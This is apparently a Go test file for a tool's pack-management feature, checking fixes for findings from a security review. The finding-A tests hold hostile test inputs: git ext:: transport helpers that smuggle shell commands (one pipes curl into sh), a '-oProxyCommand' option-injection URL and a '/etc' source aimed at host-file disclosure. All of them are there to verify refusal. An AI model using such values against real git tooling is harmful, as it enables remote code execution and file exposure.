package main

// Round-2 review tests for packs-v2 Phase 1 (docs/design/packs-v2-impl.md):
// one (or more) test per finding A–G of the second security + correctness
// review. See the matching fix comments in pack.go / run.go / knowledge.go.

import (
	"bytes"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"pix/host/config"
	"pix/host/hostenv"
	"pix/host/knowledge"
	"pix/host/sys/systest"
)

// --- finding A [CRITICAL]: knowledge-ref host-file disclosure + RCE ----------

// TestLoadPack_SharedClassMismatchFailsClosed: shared MUST match the source's
// CLASS at load time — shared=true requires a git URL (a local path there was
// the adopted-pack guard bypass), shared=false requires a local path.
func TestLoadPack_SharedClassMismatchFailsClosed(t *testing.T) {
	// shared=true + LOCAL path: the exact bypass — refuse to load.
	root := t.TempDir()
	mustWritePack(t, root, packManifest{Name: "p", Schema: 1, Knowledge: []packKnowledge{
		{Name: "bypass", Source: "/etc", Shared: true},
	}})
	if _, err := loadPack(root); err == nil || !strings.Contains(err.Error(), "requires a git URL") {
		t.Errorf("shared=true + local path must fail loadPack, got err=%v", err)
	}

	// shared=false + git URL: nonsensical "private remote" — refuse to load.
	root2 := t.TempDir()
	mustWritePack(t, root2, packManifest{Name: "p2", Schema: 1, Knowledge: []packKnowledge{
		{Name: "mismatch", Source: "https://github.com/acme/kb.git", Shared: false},
	}})
	if _, err := loadPack(root2); err == nil || !strings.Contains(err.Error(), "requires a local path") {
		t.Errorf("shared=false + git URL must fail loadPack, got err=%v", err)
	}

	// A transport-helper string is URL-shaped, never a "local path": with
	// shared=false it is a class mismatch and must fail at load too.
	root3 := t.TempDir()
	mustWritePack(t, root3, packManifest{Name: "p3", Schema: 1, Knowledge: []packKnowledge{
		{Name: "helper", Source: "ext::sh -c pwn", Shared: false},
	}})
	if _, err := loadPack(root3); err == nil {
		t.Error("shared=false + ext:: transport helper must fail loadPack")
	}

	// And the matched classes still load fine.
	rootOK := t.TempDir()
	mustWritePack(t, rootOK, packManifest{Name: "ok", Schema: 1, Knowledge: []packKnowledge{
		{Name: "team", Source: "https://github.com/acme/kb.git", Shared: true},
		{Name: "mine", Source: "~/notes/okf", Shared: false},
	}})
	if _, err := loadPack(rootOK); err != nil {
		t.Errorf("matched shared/class must load, got %v", err)
	}
}

// TestResolvePackKnowledgeRef_AdoptedLocalPathSkippedRegardlessOfShared: the
// adopted-pack skip-guard keys on the source CLASS (local path), never the
// attacker-authored shared flag — shared=true with a local path on an adopted
// pack is skipped exactly like shared=false (defense-in-depth behind the
// loadPack class check).
func TestResolvePackKnowledgeRef_AdoptedLocalPathSkippedRegardlessOfShared(t *testing.T) {
	root := t.TempDir()
	target := t.TempDir() // stands in for e.g. /etc or ~/.ssh
	for _, shared := range []bool{true, false} {
		k := packKnowledge{Name: "attacker-ref", Source: target, Shared: shared}
		_, err := resolvePackKnowledgeRef(&bytes.Buffer{}, root, true /* adopted */, k)
		if err != errPrivateRefSkippedAdopted {
			t.Errorf("shared=%v local path on an adopted pack: want errPrivateRefSkippedAdopted, got %v", shared, err)
		}
	}
}

// TestResolveBundleRef_RejectsUnsafeGitTransports: every git resolution routes
// through safeGitURL — an ext:: transport helper (arbitrary command execution)
// or a dash-leading pseudo-URL (git option injection) is refused before any
// git subprocess runs. This also hardens `knowledge use <ref>`.
func TestResolveBundleRef_RejectsUnsafeGitTransports(t *testing.T) {
	cache := t.TempDir()
	for _, ref := range []string{
		"ext::sh -c 'curl x|sh' %G.git",
		"fd::0/x.git",
		"-oProxyCommand=evil.git",
	} {
		if _, err := knowledge.ResolveBundleRef(ref, cache, &bytes.Buffer{}); err == nil || !strings.Contains(err.Error(), "unsafe") {
			t.Errorf("knowledge.ResolveBundleRef(%q): want an unsafe-transport refusal, got err=%v", ref, err)
		}
	}
	// A plain local path still resolves (never touches git).
	dir := t.TempDir()
	got, err := knowledge.ResolveBundleRef(dir, cache, &bytes.Buffer{})
	if err != nil || got == "" {
		t.Errorf("local path must still resolve, got (%q, %v)", got, err)
	}
}

// TestGitCloneArgs_UsesDashDashSeparator: gitClone's argv terminates option
// parsing with `--` before the URL, so a dash-leading URL can never be smuggled
// in as a git option (defense-in-depth behind safeGitURL).
func TestGitCloneArgs_UsesDashDashSeparator(t *testing.T) {
	args := knowledge.GitCloneArgs("-oProxyCommand=evil", "/dest")
	sep := -1
	for i, a := range args {
		if a == "--" {
			sep = i
			break
		}
	}
	if sep < 0 {
		t.Fatalf("knowledge.GitCloneArgs must contain `--`, got %v", args)
	}
	if args[sep+1] != "-oProxyCommand=evil" || args[sep+2] != "/dest" {
		t.Errorf("url+dest must follow `--`, got %v", args)
	}
}

// --- finding B [BLOCK]: adoption provenance is durable at clone time ---------

// TestClonePack_MarksAdoptionDurablyBeforeReturn: clonePack itself writes the
// pack.lock adoption marker (Remote/Commit) immediately after a successful
// clone — so even when EVERYTHING after it fails (cfg.Save, the caller's lock
// rewrite), a retried `pack use` of the same clone still sees an ADOPTED pack
// and keeps refusing its local knowledge refs.
func TestClonePack_MarksAdoptionDurablyBeforeReturn(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_DATA_HOME", filepath.Join(dir, "data"))

	const url = "https://example.com/attacker/pack.git"
	env := hostenv.Env{System: &systest.Fake{RunFn: func(name string, args ...string) (string, error) {
		if len(args) > 0 && args[0] == "clone" {
			dest := args[len(args)-1]
			if err := os.MkdirAll(dest, 0o755); err != nil {
				return "", err
			}
			if err := writePackManifest(dest, packManifest{Name: "adopted", Schema: 1}); err != nil {
				return "", err
			}
		}
		if len(args) >= 3 && args[2] == "rev-parse" {
			return "abc123\n", nil
		}
		return "", nil
	}}}

	dest, err := clonePack(env, &bytes.Buffer{}, url)
	if err != nil {
		t.Fatalf("clonePack: %v", err)
	}
	// The marker is on disk NOW — before any runPackUse post-clone step ran
	// (this is the "subsequent Save failed" state: nothing after clonePack).
	lock := readPackLock(dest)
	if lock.Remote != url {
		t.Errorf("pack.lock Remote = %q, want %q (adoption must be recorded by clonePack itself)", lock.Remote, url)
	}
	if lock.Commit != "abc123" {
		t.Errorf("pack.lock Commit = %q, want abc123", lock.Commit)
	}
	if !isAdoptedPack(dest) {
		t.Error("a retry must see the clone as ADOPTED even though no activation ever completed")
	}
}

// --- finding C [BLOCK]: removal is lock-attributed ONLY ----------------------

// TestPrevPackKnowledgeIDs_EmptyLockRemovesNothing: the removal set is computed
// STRICTLY from pack.lock — an empty/missing lock yields an empty set (never a
// manifest-based guess that could delete a bundle the user owns).
func TestPrevPackKnowledgeIDs_EmptyLockRemovesNothing(t *testing.T) {
	if ids := prevPackKnowledgeIDs(packLock{}); len(ids) != 0 {
		t.Errorf("empty lock must attribute nothing, got %v", ids)
	}
}

// TestPackUse_EmptyLockSwitchRemovesNothing: with the previous pack's
// activation attribution LOST (since round-2 A that is the HOST-STATE
// activation record — the pack.lock is only a hint), switching packs removes
// NOTHING — the previous pack's bundle (which, attribution-less, is
// indistinguishable from a user-added one) survives. Accumulation is accepted
// over deleting a user's bundle.
func TestPackUse_EmptyLockSwitchRemovesNothing(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))

	rootA := filepath.Join(dir, "a")
	if err := os.MkdirAll(filepath.Join(rootA, "knowledge"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(rootA, "knowledge", "x.md"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	mustWritePack(t, rootA, packManifest{Name: "a", Schema: 1, Integrations: []packIntegration{{Name: "A", MCP: "a-mcp"}}})
	rootB := filepath.Join(dir, "b")
	mustWritePack(t, rootB, packManifest{Name: "b", Schema: 1})

	var out bytes.Buffer
	// --yes: Tier-1 pack (declares an mcp); tests have no TTY (Phase-2 gate).
	runPackUse(fakeGitEnv(nil), &out, []string{rootA, "--yes"})
	aID := knowledge.CanonicalizeKnowledgeBundle(filepath.Join(rootA, "knowledge"))
	cfg, _ := config.Load()
	if !slices.Contains(cfg.KnowledgeBundles, aID) || !slices.Contains(cfg.MCP, "a-mcp") {
		t.Fatalf("setup: pack use A did not attach: %+v", cfg)
	}

	// Simulate lost/never-written attribution: drop BOTH the host-state
	// activation record (the authoritative source) and the pack.lock hint.
	store, serr := loadPackTrustStore()
	if serr != nil {
		t.Fatal(serr)
	}
	store.Activation = nil
	if err := store.save(); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(packLockPath(rootA)); err != nil {
		t.Fatal(err)
	}

	out.Reset()
	runPackUse(fakeGitEnv(nil), &out, []string{rootB})
	cfg2, _ := config.Load()
	if !slices.Contains(cfg2.KnowledgeBundles, aID) {
		t.Errorf("empty lock: the switch must remove NOTHING (no manifest fallback), lost %q from %v", aID, cfg2.KnowledgeBundles)
	}
	if !slices.Contains(cfg2.MCP, "a-mcp") {
		t.Errorf("empty lock: the switch must not guess mcp removals either, cfg.MCP = %v", cfg2.MCP)
	}
}

// --- finding D [BLOCK]: same-pack reactivation keeps attribution + reconciles
// removed manifest fields ------------------------------------------------------

// TestPackUse_SamePackReactivationPreservesAttribution: `pack use A` twice in a
// row must not erase A's lock attribution — a later switch to B still detaches
// exactly what A contributed.
func TestPackUse_SamePackReactivationPreservesAttribution(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))

	rootA := filepath.Join(dir, "a")
	mustWritePack(t, rootA, packManifest{Name: "a", Schema: 1, Integrations: []packIntegration{{Name: "A", MCP: "a-mcp"}}})
	rootB := filepath.Join(dir, "b")
	mustWritePack(t, rootB, packManifest{Name: "b", Schema: 1})

	env := fakeGitEnv(nil)
	var out bytes.Buffer
	// --yes: Tier-1 pack (declares an mcp); tests have no TTY (Phase-2 gate).
	// The reactivation needs no --yes: the first use recorded the acceptance.
	runPackUse(env, &out, []string{rootA, "--yes"})
	out.Reset()
	runPackUse(env, &out, []string{rootA}) // same-pack reactivation

	lock := readPackLock(rootA)
	if !slices.Contains(lock.MCP, "a-mcp") {
		t.Fatalf("same-pack reactivation erased the lock attribution, lock.MCP = %v", lock.MCP)
	}

	out.Reset()
	runPackUse(env, &out, []string{rootB})
	cfg, _ := config.Load()
	if slices.Contains(cfg.MCP, "a-mcp") {
		t.Errorf("switching to B after a same-pack reactivation must still remove a-mcp, cfg.MCP = %v", cfg.MCP)
	}
}

// TestPackUse_SamePackReactivationReconcilesRemovedFields: a config field
// (gog_account, ollama_bridge_model) REMOVED from the manifest between
// activations reverts to its prior value on the next `pack use` of the same
// pack, instead of staying live forever.
func TestPackUse_SamePackReactivationReconcilesRemovedFields(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.SetGogAccount("manual@example.com")
	cfg.OllamaBridgeModel = "manual-model"
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}

	root := filepath.Join(dir, "work")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		GogAccount: "work@company.com", OllamaBridgeModel: "work-model"})

	env := fakeGitEnv(nil)
	var out bytes.Buffer
	runPackUse(env, &out, []string{root})
	cfg1, _ := config.Load()
	if cfg1.GogAccount != "work@company.com" || cfg1.OllamaBridgeModel != "work-model" {
		t.Fatalf("setup: pack did not layer config: %+v", cfg1)
	}

	// The author drops both fields from the manifest, then re-uses the pack.
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1})
	out.Reset()
	runPackUse(env, &out, []string{root})
	cfg2, _ := config.Load()
	if cfg2.GogAccount != "manual@example.com" {
		t.Errorf("removed gog_account must revert to prior on re-use, got %q", cfg2.GogAccount)
	}
	if cfg2.OllamaBridgeModel != "manual-model" {
		t.Errorf("removed ollama_bridge_model must revert to prior on re-use, got %q", cfg2.OllamaBridgeModel)
	}
}

// --- finding E [BLOCK]: post-Save registration is idempotent over ALL pack
// MCPs, not just newly-added ---------------------------------------------------

// TestPackUse_RegistersMcpAlreadyPresentInConfig: a pack MCP already in cfg.MCP
// (a retry after a failed gateway registration, or a user-preexisting name the
// pack redeclares) is still handed to registerServers — observable here as the
// registration note from the fake (gateway-less) env, which the old
// only-newly-added gate never produced.
func TestPackUse_RegistersMcpAlreadyPresentInConfig(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.AddMCP("fastmail") // already present BEFORE pack use
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}

	root := filepath.Join(dir, "work")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Integrations: []packIntegration{{Name: "Fastmail", MCP: "fastmail"}}})

	var out bytes.Buffer
	// --yes: Tier-1 pack (declares an mcp); tests have no TTY (Phase-2 gate).
	runPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"})
	// registerServers must be INVOKED for an already-present pack MCP (retry
	// recovery), not skipped by an only-newly-added gate — observable as its own
	// per-server line for fastmail (here classified remote in the fake env).
	if !strings.Contains(out.String(), "fastmail") {
		t.Errorf("registerServers must run for an already-present pack MCP (retry recovery), got:\n%s", out.String())
	}
}

// TestPackAdd_Mcp_RetryReregisters: `pack add mcp <name>` on the active pack
// re-registers even when the name is already in cfg.MCP, so a retry after a
// failed gateway registration actually recovers instead of silently no-oping.
func TestPackAdd_Mcp_RetryReregisters(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1})
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.Pack = root
	cfg.AddMCP("fastmail") // a previous attempt already persisted the name
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	runPackAdd(fakeGitEnv(nil), &out, []string{"mcp", "fastmail", root, "--yes"})
	// Re-invocation is observable as registerServers' own per-server line for
	// fastmail (here classified remote in the fake env), not the error-only note.
	if !strings.Contains(out.String(), "fastmail") {
		t.Errorf("retrying pack add mcp must re-invoke registration, got:\n%s", out.String())
	}
}

// --- finding F [BLOCK] + round-3 R2: every synth yields its OWN complete kit
// dir — no shared mutable path, no no-kit window --------------------------------

// TestSynthesizePackKit_ResynthOverExistingKit: two synths of the SAME pack
// yield two INDEPENDENT, complete kit dirs (round-3 R2: each launch gets a
// unique per-launch dir, so concurrent launches never clash and there is no
// replace-in-place window), and neither leaves legacy temp/aside debris.
func TestSynthesizePackKit_ResynthOverExistingKit(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"a", "b"} {
		if err := os.WriteFile(filepath.Join(root, "bin", name), []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	p := &packInfo{Root: root, Manifest: packManifest{Name: "p", Proxies: []packProxy{{Name: "a"}, {Name: "b"}}}}

	kit1, err := synthesizePackKit(p)
	if err != nil || kit1 == "" {
		t.Fatalf("first synth failed: %q, err=%v", kit1, err)
	}
	kit2, err := synthesizePackKit(p) // second launch, same pack
	if err != nil || kit2 == "" {
		t.Fatalf("second synth failed: %q, err=%v", kit2, err)
	}
	if kit2 == kit1 {
		t.Fatalf("round-3 R2: two launches must get two independent kit dirs, got %q twice", kit1)
	}
	// BOTH kits are complete and valid — the second synth never mutated or
	// displaced the first (a concurrent launch may still be reading it).
	for _, kit := range []string{kit1, kit2} {
		for _, f := range []string{"spec.yaml", "files/home/.local/bin/a", "files/home/.local/bin/b"} {
			if _, err := os.Stat(filepath.Join(kit, f)); err != nil {
				t.Errorf("kit %s incomplete, missing %s: %v", kit, f, err)
			}
		}
	}
	// No legacy swap debris (temp/aside dirs from the old replace-in-place synth).
	entries, err := os.ReadDir(filepath.Dir(kit2))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.Contains(e.Name(), kitTmpInfix) || strings.Contains(e.Name(), kitOldInfix) || strings.HasSuffix(e.Name(), ".tmp") {
			t.Errorf("leftover synth debris: %s", e.Name())
		}
	}
}

// --- finding G [CONCERN]: create-time pack marker round-trip ------------------

// TestSandboxPackMarker_RoundTrip: the marker records the canonicalized pack
// root at create, reads back identically, and an empty pack removes it.
func TestSandboxPackMarker_RoundTrip(t *testing.T) {
	ws := t.TempDir()
	root := filepath.Join(t.TempDir(), "work")
	writeSandboxPackMarker(ws, root)
	if got := readSandboxPackMarker(ws); got != canonicalizePackRoot(root) {
		t.Errorf("marker round-trip = %q, want %q", got, canonicalizePackRoot(root))
	}
	writeSandboxPackMarker(ws, "") // pack-less create removes it
	if got := readSandboxPackMarker(ws); got != "" {
		t.Errorf("pack-less create must remove the marker, got %q", got)
	}
}
